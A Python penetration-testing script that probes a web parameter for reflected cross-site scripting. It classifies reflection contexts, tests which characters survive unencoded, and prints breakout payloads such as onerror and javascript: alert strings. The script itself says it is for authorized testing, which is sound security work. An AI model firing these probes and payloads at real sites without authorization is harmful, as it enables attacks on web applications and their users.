#!/usr/bin/env python3
"""xss_probe.py — owned reflected-XSS DETECTION + context classifier for pen_test.

Detection, not blind payload spraying. It:

  1. reflects a unique marker through the parameter and finds WHERE it lands
  2. classifies the reflection context (HTML body / attribute / <script> / URL /
     comment) — because the context decides which payload can execute
  3. probes which XSS-significant characters (< > " ' ` / =) survive UNENCODED
     in that context — the actual signal that a breakout is possible
  4. emits the context-appropriate breakout payload to try

It does NOT prove execution — a reflected `<script>` isn't a confirmed XSS
until a browser runs it. For that, hand the emitted payload to claude-in-chrome
and watch it fire (see knowledge/xss.md). This keeps false positives out of the
report: "reflected and unencoded in a script context" is a candidate; "the
alert box fired in a real browser" is the finding.

AUTHORIZATION: sends live requests. Authorized targets only.

Usage:
    python3 xss_probe.py -u "https://app/search?q=test" --param q
    python3 xss_probe.py -u "https://app/x" -X POST --location form --param name --data "name=a"
"""

from __future__ import annotations

import argparse
import json as jsonlib
import re

import _httpcore as core

MARKER = "xSsPrObE9137"
# Characters whose survival (unencoded) enables a breakout; we test each.
SPECIAL = ["<", ">", "\"", "'", "`", "/", "=", "(", ")", ";"]


def _spec(args) -> core.RequestSpec:
    base_json = jsonlib.loads(args.json) if args.json else None
    base_form = dict(core.parse_kv(args.data.split("&"), "=")) if args.data else {}
    return core.RequestSpec(method=args.method, url=args.url, param=args.param,
                            location=args.location, base_json=base_json, base_form=base_form)


def classify_context(body: str, marker: str) -> list[str]:
    """Return every distinct reflection context the marker appears in."""
    contexts = []
    for m in re.finditer(re.escape(marker), body):
        i = m.start()
        before = body[max(0, i - 120):i]
        after = body[i + len(marker): i + len(marker) + 40]
        # inside a <script> block?
        last_script_open = before.rfind("<script")
        last_script_close = before.rfind("</script")
        if last_script_open > last_script_close:
            contexts.append("js:<script> block — breakout may not even need a tag")
            continue
        # inside an HTML comment?
        if "<!--" in before and "-->" not in before[before.rfind("<!--"):]:
            contexts.append("html-comment — need --> to escape")
            continue
        # inside a tag attribute?
        last_lt = before.rfind("<")
        last_gt = before.rfind(">")
        if last_lt > last_gt:  # we're inside an open tag
            # which quote encloses us?
            attr_frag = before[last_lt:]
            dq = attr_frag.count("\"") % 2 == 1
            sq = attr_frag.count("'") % 2 == 1
            if dq:
                contexts.append('html-attr (double-quoted) — need " to break out')
            elif sq:
                contexts.append("html-attr (single-quoted) — need ' to break out")
            else:
                contexts.append("html-attr (unquoted) — space/> may break out")
            # event-handler / href sinks are extra dangerous
            if re.search(r'(?i)(href|src|on\w+)\s*=\s*["\']?[^"\']*$', attr_frag):
                contexts[-1] += " [in href/src/on* sink — javascript: or handler injection]"
            continue
        # inside a URL context (href/src value already closed tag)?
        # default: HTML text node
        contexts.append("html-text — a raw <script>/<img onerror> tag can execute here")
    return contexts or ["not reflected"]


def char_survival(client: core.Client, spec: core.RequestSpec) -> dict[str, bool]:
    """Send marker+each special char, check which survive unencoded next to it."""
    survived = {}
    for ch in SPECIAL:
        probe = f"{MARKER}{ch}{MARKER}"
        r = client.request(**spec.build(probe))
        # survived if the exact raw sequence (with the char) is present
        survived[ch] = r.ok and probe in r.text
    return survived


def suggest_payload(contexts: list[str], survived: dict[str, bool]) -> list[str]:
    tips = []
    can_tag = survived.get("<") and survived.get(">")
    can_dq = survived.get("\"")
    can_sq = survived.get("'")
    for ctx in contexts:
        if ctx.startswith("html-text") and can_tag:
            tips.append('html-text: <img src=x onerror=alert(document.domain)>')
        elif ctx.startswith("js:") :
            tips.append("js: ';alert(document.domain);// (or </script><img ...> if < survives)")
        elif ctx.startswith("html-attr (double") and can_dq:
            tips.append('attr(dq): "><img src=x onerror=alert(document.domain)>')
        elif ctx.startswith("html-attr (single") and can_sq:
            tips.append("attr(sq): '><img src=x onerror=alert(document.domain)>")
        elif "href/src" in ctx:
            tips.append("sink: javascript:alert(document.domain) as the URL value")
        elif ctx.startswith("html-comment"):
            tips.append("comment: --><img src=x onerror=alert(document.domain)>")
    return tips


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--param", required=True)
    p.add_argument("--location", default="query", choices=core.LOCATIONS)
    p.add_argument("-X", "--method", default="GET")
    p.add_argument("--data"); p.add_argument("--json")
    core.add_common_args(p)
    args = p.parse_args()
    core.require_scheme(args.url)
    client = core.client_from_args(args)
    spec = _spec(args)

    print(f"Target: {args.method} {args.url}  |  param `{args.param}` in {args.location}")
    r = client.request(**spec.build(MARKER))
    if not r.ok:
        raise SystemExit(f"request failed: {r.error}")
    if MARKER not in r.text:
        print("\n[-] Marker not reflected in the response body. Not a reflected-XSS point")
        print("    (could still be stored/DOM-based — check other sinks and the JS bundle).")
        return

    contexts = classify_context(r.text, MARKER)
    print("\n[reflection contexts]")
    for c in contexts:
        print(f"  - {c}")

    print("\n[unencoded character survival]")
    survived = char_survival(client, spec)
    surviving = [c for c, ok in survived.items() if ok]
    print(f"  survive raw: {' '.join(surviving) if surviving else '(none — output likely encoded)'}")

    tips = suggest_payload(contexts, survived)
    print("\n" + "=" * 60)
    if tips and surviving:
        print("[!] Reflected-XSS CANDIDATE — try these, then PROVE execution in claude-in-chrome:")
        for t in tips:
            print(f"    {t}")
        print("\n  Not a confirmed finding until a real browser executes it (alert/DNS callback).")
    else:
        print("[-] Reflected but the breakout characters appear encoded — low XSS likelihood here.")
        print("    Re-check: different output encoding per context, DOM sinks, and stored variants.")


if __name__ == "__main__":
    main()
